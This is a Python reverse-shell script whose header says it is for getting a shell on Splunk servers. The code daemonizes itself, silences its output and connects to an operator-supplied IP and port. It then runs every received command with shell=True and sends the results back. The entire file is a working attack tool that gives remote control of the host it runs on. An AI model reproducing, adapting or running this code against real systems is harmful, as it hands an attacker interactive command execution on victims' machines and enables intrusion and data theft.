#!/usr/bin/env python


#**************************************************************************#
#  Filename: py_rev_shel.py             (Created: 2016-08-18)              #
#                                       (Updated: 2025-01-23)              #
#  Info:                                                                   #
#    This was a very robust solution in python 2. I needed a quick and     #
#    dirty way to pop a reverse shell with newer versions of splunk;       #
#    Forgive my haste and I hope it's what you're looking for.             #
#  Author:                                                                 #
#    Ryan Hays (The good stuff)                                            #
#    Cole Lucas (The bad stuff)                                            #
#**************************************************************************#

import os
import sys
import socket
import subprocess

UMASK = 0
WORKDIR = "/"
MAXFD = 1024

REDIRECT_TO = os.devnull if hasattr(os, "devnull") else "/dev/null"

def createdaemon():
    try:
        pid = os.fork()
        if pid > 0:
            os._exit(0)
    except OSError as e:
        raise Exception(f"Fork #1 failed: {e.errno} ({e.strerror})")

    os.setsid()

    try:
        pid = os.fork()
        if pid > 0:
            os._exit(0)
    except OSError as e:
        raise Exception(f"Fork #2 failed: {e.errno} ({e.strerror})")

    os.chdir(WORKDIR)
    os.umask(UMASK)

    maxfd = os.sysconf("SC_OPEN_MAX") if hasattr(os, "sysconf") else MAXFD

    for fd in range(0, maxfd):
        try:
            os.close(fd)
        except OSError:
            pass

    os.open(REDIRECT_TO, os.O_RDWR)
    os.dup2(0, 1)
    os.dup2(0, 2)

    return 0

def reverse_shell(ip, port):
    try:
        so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        so.connect((ip, port))
    except socket.error as e:
        sys.exit(f"Connection error: {e}")

    try:
        while True:
            command = so.recv(1024).decode("utf-8")
            if len(command.strip()) == 0:
                continue

            if command.lower() == "exit":
                break

            try:
                result = subprocess.run(
                    command, shell=True, capture_output=True, text=True
                )
                output = result.stdout + result.stderr
            except Exception as e:
                output = f"Error executing command: {str(e)}\n"

            so.send(output.encode("utf-8"))
    except Exception as e:
        so.send(f"Session error: {str(e)}\n".encode("utf-8"))
    finally:
        so.close()

if __name__ == "__main__":
    ret_code = createdaemon()

    if len(sys.argv) < 3:
        sys.exit("Usage: python3 reverse_shell.py <ip> <port>")

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    reverse_shell(target_ip, target_port)
